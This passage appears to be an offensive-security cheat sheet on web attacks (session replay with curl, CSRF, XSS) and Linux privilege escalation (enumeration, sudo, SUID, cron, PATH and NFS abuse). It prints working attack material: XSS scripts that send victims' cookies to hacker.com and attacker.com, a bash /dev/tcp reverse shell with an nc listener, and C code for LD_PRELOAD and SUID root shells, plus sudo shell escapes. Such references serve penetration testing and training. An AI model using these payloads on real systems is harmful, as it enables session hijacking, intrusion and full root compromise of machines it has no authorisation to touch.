- `curl`: is a command-line tool for transferring data over network protocols (HTTP, HTTPS, FTP, etc.). In security testing, it is often used to manually craft requests, replay sessions, test authentication, and validate session handling.

```bash
# Send a request using a stolen or reused session cookie (session hijacking test)
curl -b "sessionid=123456; user=alice" https://example.com/dashboard

# Load cookies from a Netscape-format cookie file
curl -b cookies.txt https://example.com/profile

# Save cookies returned by the server for later reuse
curl -c cookies.txt https://example.com/login

# Send a request with custom headers (common during auth testing)
curl -H "User-Agent: Mozilla/5.0" \
     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" \
     https://api.example.com/v1/users

# Replay a POST request using an existing session cookie
curl -b "PHPSESSID=abcd1234" \
     -X POST \
     -d "email=alice@example.com&role=admin" \
     https://example.com/update-profile
```

```bash
# Netscape HTTP Cookie File

.example.com    TRUE    /       FALSE   1735689600  sessionid   123456
.example.com    TRUE    /       FALSE   1735689600  user        alice

# Template explanation
Domain -> .example.com
Include subdomains -> TRUE or FALSE
Path -> /
Secure flag -> TRUE (HTTPS only) or FALSE
Expiration (Unix timestamp) -> 1735689600
Cookie name -> sessionid
Cookie value -> 123456
```

#### Cross-Site Request Forgery

Cross‑Site Request Forgery is a web vulnerability that tricks an authenticated user into unknowingly performing an action on a website they trust. Because the browser automatically includes session cookies, the target application may treat the forged request as legitimate if proper protections are not in place.

If a user is already authenticated to a site and that site does not verify the origin or intent of requests, an attacker can cause unintended actions to be executed on the user’s behalf.

```bash
# Example of a vulnerable request
http://bank.com/transfer?amount=6000&to=hacker
```

If the user is logged into `bank.com` and visits this URL, the browser automatically sends the session cookie.
Without CSRF protection, the server may process the transfer as if the user intentionally requested it.

The core challenge in CSRF is causing the victim’s browser to make the request. This can be done without user awareness by embedding the request into normal-looking content.

```html
<!-- Victim visits a malicious website -->

<!-- Browser automatically loads this HTML -->
<img src="http://bank.com/transfer?amount=6000&to=hacker">

<!-- The request is sent with the victim's authenticated session -->
```

#### Cross Site Scripting

Cross‑Site Scripting is a web vulnerability that allows attackers to inject and execute malicious JavaScript in a victim’s browser without their knowledge. It typically occurs when user‑supplied input is not properly validated or escaped before being rendered in a webpage.

There are two main Cross-Site Scripting types:

- **Reflected XSS**: Payload is reflected immediately in the response

- **Stored XSS**: Payload is stored (e.g., database) and executed for every visitor

---

- `custom_script.js`: is an example of a malicious JavaScript payload commonly used in Cross‑Site Scripting (XSS) attacks. Its purpose is to demonstrate how injected JavaScript can execute in a victim’s browser and access sensitive data such as session cookies when proper protections are missing.

```js
// Script example to steal session cookies
<script>
  window.open(
    "http://hacker.com/steal?c=" + document.cookie
  );
</script>
```

- `xsser`: is an automated Cross‑Site Scripting (XSS) detection and exploitation framework used to identify reflected, stored, and DOM‑based XSS vulnerabilities. It supports multiple injection techniques, payload encodings, and evasion methods, and is commonly used in web application security testing.

```bash
# Basic XSS scan against a URL
xsser -u "http://example.com/search.php?q=test"

# Scan a specific parameter only
xsser -u "http://example.com/search.php?q=test" -p q

# Test POST parameters (e.g., login or form submission)
xsser -u "http://example.com/comment.php" \
-d "username=alice&comment=test"

# Use a predefined XSS payload
xsser -u "http://example.com/search.php?q=test" --payload "<script>alert(1)</script>"

# Automatic payload generation and fuzzing
xsser -u "http://example.com/search.php?q=test" --auto

# Crawl the website and test discovered URLs
xsser -u "http://example.com" --crawl

# Bypass basic filters using payload obfuscation
xsser -u "http://example.com/search.php?q=test" --encoding hex

# Launch an attack using an external listener (cookie stealing demo)
xsser -u "http://example.com/search.php?q=test" \
--payload "<script>new Image().src='http://attacker.com/?c='+document.cookie</script>"

# Generate a report of discovered vulnerabilities
xsser -u "http://example.com/search.php?q=test" --report xsser_report.txt
```

### Privilege Escalation

Having access to a system doesn't always mean that we are able to do anything we want. Most of the times, when gaining access to a system we will probably be limited to a normal user with limited privileges, only allowing us to do little to no abuse.

Enters privilege escalation. The objective of this discipline is, once having access to a system, no matter what user we start in we exploit it to escalate our permissions to a more privileged user, or the admin itself if possible.

By exploiting and escalating our privileges, we will be able to abuse the system better and obtain explore it more.

The first step of this exploitation is exploring it's abuse vectors, covered by enumarition.

#### Enumeration

Enumeration is the systematic process of collecting detailed information about a target system using the level of access currently available. The objective is to understand the system’s configuration, operating environment, users, processes, services, network settings, and security controls in order to identify potential weaknesses or escalation paths. Unlike initial discovery, enumeration focuses on extracting maximum insight from existing access rather than attempting new intrusions.

---

<ins>Linux</ins>

- `default`: manual local enumeration commands executed on a Linux system to gather system, user, process, file, and network information available to the current user context.

```shell
# System identification
hostname
uname -a                  # Kernel and system architecture information
cat /proc/version         # Detailed kernel version information
cat /etc/issue            # Distribution and OS information

# Process enumeration
ps                        # Processes for current terminal
ps -A                     # All running processes
ps axjf                   # Process tree with hierarchy

# Environment and user context
env                       # Environment variables
id                        # Current user and group IDs
id user                   # Information about a specific user
history                   # Command history for the current session
cat /home/user/.bash_history  # Persistent command history (if accessible)

# User and account information
cat /etc/passwd           # Local user accounts

# File system inspection
ls -la                    # List all files, including hidden ones

# Privilege and sudo configuration
sudo -l                   # Commands the current user can run with sudo

# Network enumeration
ifconfig                  # Network interfaces (legacy)
ip route                  # Routing table
netstat                   # Network connections and statistics
netstat -a                # All connections and listening ports
netstat -at               # TCP connections
netstat -au               # UDP connections
netstat -l                # Listening services
netstat -s                # Network statistics
netstat -tp               # Process and service associations

# File and permission discovery
find / -type f -perm -04000 -ls 2>/dev/null   # Files with SUID/SGID set
getcap -r / 2>/dev/null                       # Files with Linux capabilities
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
                                              # Writable directories

# Scheduled tasks
cat /etc/crontab            # System-wide cron jobs
crontab -l                  # List cron jobs for the current user
crontab -u root -l          # List cron jobs for another user (if permitted)

# NFS configuration
cat /etc/exports            # Exported NFS shares
showmount -e victim_ip      # Enumerate remote NFS exports

# Command filtering utilities (used during enumeration)
find                        # Search files and directories
grep                        # Filter and match patterns in output
```

- `LinPEAS`: is a comprehensive Linux privilege‑escalation enumeration script that performs extensive system checks, highlighting potential escalation vectors using color‑coded and categorized output. It is part of the PEASS (Privilege Escalation Awesome Scripts Suite) project and is widely used in penetration testing and CTF environments.

```bash
# Get the enumeration tool
git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
```

- `LinEnum`: is a lightweight Linux enumeration script that focuses on identifying common privilege‑escalation misconfigurations such as weak file permissions, vulnerable kernel versions, cron jobs, and sudo rules. It is often used for quick initial assessments.

```bash
# Get the enumeration tool
git clone https://github.com/rebootuser/LinEnum
```

- `LES (Linux Exploit Suggester)`: is a kernel‑focused enumeration tool that analyzes the running kernel version and suggests known local privilege‑escalation exploits based on publicly disclosed vulnerabilities.

```bash
# Get the enumeration tool
git clone https://github.com/mzet-/linux-exploit-suggester
```

- `Linux Smart Enumeration (LSE)`: is a structured and modular enumeration script that categorizes findings by severity and relevance. It emphasizes clarity and signal‑to‑noise reduction, making it suitable for professional assessments.

```bash
# Get the enumeration tool
git clone https://github.com/diego-treitos/linux-smart-enumeration
```

- `Linux Priv Checker`: is a legacy privilege‑escalation enumeration script that checks for insecure configurations, sensitive files, and weak permissions. While less actively maintained, it remains useful for older systems.

```bash
# Get the enumeration tool
git clone https://github.com/linted/linuxprivchecker
```

#### Kernel Exploits

Kernel exploitation is a privilege‑escalation technique that targets vulnerabilities in the operating system kernel. Since the kernel operates at the highest privilege level, successful exploitation typically results in full administrative (root) access. Systems running outdated, unpatched, or misconfigured kernels are particularly susceptible to this class of attacks, as publicly disclosed vulnerabilities often have corresponding proof‑of‑concept or weaponized exploits available.

---

- `Exploit Database (Exploit‑DB)`: is a public archive of exploits and proof‑of‑concept code covering a wide range of platforms, including Linux kernel vulnerabilities. It provides detailed exploit descriptions, references, and affected versions.

- `searchsploit`: is a command‑line utility that allows offline searching of the Exploit‑DB repository. It enables rapid identification of kernel exploits based on version numbers, distribution names, and vulnerability identifiers.

```
# Identify the running kernel version
uname -a
uname -r

# Search for Linux kernel exploits using searchsploit
searchsploit linux kernel 4.4

# Narrow the search to privilege escalation exploits
searchsploit linux kernel 4.4 privilege escalation

# Copy an exploit from Exploit-DB locally for review
searchsploit -m linux/local/12345.c
```

#### Sudo Exploits

Sudo‑based privilege escalation exploits arise from misconfigured sudo permissions that allow non‑privileged users to execute specific commands with elevated privileges. While sudo is designed to restrict administrative access, certain binaries can be abused to escape their intended functionality and execute arbitrary commands or access sensitive files. These weaknesses are typically the result of allowing powerful utilities to run as root without adequate restriction.

Exploitation of sudo misconfigurations focuses on identifying binaries that permit command execution, file reading or writing, shell escapes, or environment manipulation. Enumeration of sudo permissions is therefore a critical step in post‑exploitation, as even a single allowed command can be sufficient to gain full root access. Public resources such as [GTFOBins](https://gtfobins.github.io/) document known sudo‑abusable binaries and common escalation techniques.

---

- `sudo`: is a privilege delegation mechanism that allows permitted users to execute predefined commands with elevated privileges. When improperly restricted, sudo‑allowed binaries may be abused to escalate privileges.

```bash
# Apache example: forcing an error to leak file contents
apache2 -f /etc/shadow

# Escalation using find (spawns a shell if permitted via sudo)
sudo find / -type f -name "sh" -exec /bin/sh \;

# Escalation using nmap interactive mode (legacy versions)
sudo nmap --interactive
# Inside nmap prompt:
!sh
```

- `LD_PRELOAD`: is a dynamic linker environment variable that forces the loading of user‑supplied shared libraries before all others, which can be abused for privilege escalation when preserved in sudo environments.

```bash
# In sudo -l information
env_keep+=LD_PRELOAD
```

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
# Compile the malicious shared library
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# Execute a permitted sudo command with LD_PRELOAD
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

#### SUID Exploits

Set User ID (SUID) is a special permission in Unix‑like operating systems that allows a binary to execute with the privileges of its owner rather than the privileges of the user executing it. When a file owned by the root user has the SUID bit set, any user who runs that file temporarily gains root‑level privileges for the duration of the program’s execution. This mechanism is intended to allow controlled access to privileged operations; however, it introduces significant risk when applied to unsafe or overly powerful binaries.

SUID‑based privilege escalation occurs when a SUID binary can be abused to execute arbitrary commands, spawn a shell, or manipulate sensitive files. Because the binary runs with root privileges, successful abuse typically results in full system compromise. This class of vulnerability is configuration‑based and remains exploitable regardless of kernel patch level if insecure SUID binaries are present.

Well‑known SUID‑abusable binaries and techniques are documented in: https://gtfobins.github.io/

#### Capabilities Exploits

Linux capabilities provide a more granular privilege model than SUID by dividing root privileges into discrete units (e.g., file access, network administration, process control). Instead of granting full root access, a binary may be assigned only the specific capabilities required for its function. This model is designed to reduce the attack surface associated with privileged execution.

Capabilities‑based privilege escalation occurs when a binary is assigned excessive or inappropriate capabilities. If such a binary allows user‑controlled input, command execution, or file manipulation, the assigned capability can be leveraged to read restricted files, modify system state, or escalate to full root privileges. Although more fine‑grained than SUID, misconfigured capabilities can be equally dangerous.

As with SUID, binaries known to be exploitable through misconfigured capabilities are cataloged in: https://gtfobins.github.io/

#### Cron Jobs Exploits

Cron jobs are scheduled tasks in Unix‑like operating systems that execute commands or scripts automatically at predefined intervals. Each cron job runs with the privileges of the user who owns it, which commonly includes the root user for system‑level maintenance tasks. As a result, misconfigured cron jobs represent a frequent and effective local privilege‑escalation vector.

Cron‑based privilege escalation occurs when scheduled scripts or commands are insecurely configured. Common weaknesses include writable script files, writable directories in the execution path, or the use of relative paths instead of absolute paths. In such cases, an unprivileged user may be able to modify the executed script, replace it with a malicious one, or manipulate the PATH environment variable so that a different executable is run when the cron job executes. When the cron job runs as root, this typically results in full system compromise.

---

- `reverse_shell`: is a payload or technique that causes a compromised host to initiate an outbound connection to an attacker-controlled system, providing interactive command execution.

```shell
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

```bash
# Attacker machine listener
nc -nlvp 4444
```

#### PATH Exploits

PATH hijacking is a privilege‑escalation technique that abuses how Unix‑like systems resolve executable names. When a command is executed without an absolute path, the operating system searches for the executable in the directories listed in the $PATH environment variable, in order of precedence. If a malicious executable with the same name exists earlier in the search path, it will be executed instead of the intended binary.

This technique becomes particularly dangerous when applied to privileged programs, such as SUID binaries or root‑owned scripts, that invoke external commands without specifying their full paths. By manipulating the $PATH variable, an unprivileged user can cause the privileged program to execute attacker‑controlled code, potentially resulting in full privilege escalation.

---

- `PATH hijacking`: is a privilege‑escalation method that exploits improper command path resolution by redirecting execution to a malicious binary placed earlier in the $PATH.

```bash
# Prepend a writable directory to the PATH variable
export PATH=/tmp:$PATH

# Create a malicious replacement for the expected command
# This file must match the name of the command called by the vulnerable program
echo "/bin/bash" > /tmp/test
chmod +x /tmp/test
```

### NFS Exploits

Privilege escalation is not always limited to exploiting the local system configuration. In many scenarios, elevated access can be obtained by abusing credentials, trust relationships, or network services that allow authenticated or privileged access from another context. Examples include the discovery of private SSH keys, reusable credentials, or misconfigured network file‑sharing services.

Network File System (NFS) enables directories to be shared across multiple hosts over a network. NFS misconfigurations can introduce severe privilege‑escalation risks, particularly when the no_root_squash option is enabled. This option disables the usual mapping of root users to an unprivileged account, allowing files created on the share to retain root ownership.

When an NFS share exported with no_root_squash is writable, an attacker can mount the share, create a malicious executable, assign it the SUID bit, and then execute it locally on the target system to gain root privileges.

---

- `NFS privilege escalation`: is a technique that abuses misconfigured NFS exports to create root‑owned SUID binaries, leading to full system compromise.

```bash
# Mount a writable NFS share on the attacker machine
mount -o rw 192.168.1.50:/exports/home /mnt/nfs
```

```c
// Privilege escalation code in C
#include <unistd.h>
#include <stdlib.h>

int main() {
    setgid(0);
    setuid(0);
    system("/bin/sh");
    return 0;
}
```

```bash
# Compile the exploit inside the mounted NFS directory
gcc exploit.c -o exploit -w

# Assign the SUID bit to the binary
chmod +s exploit
```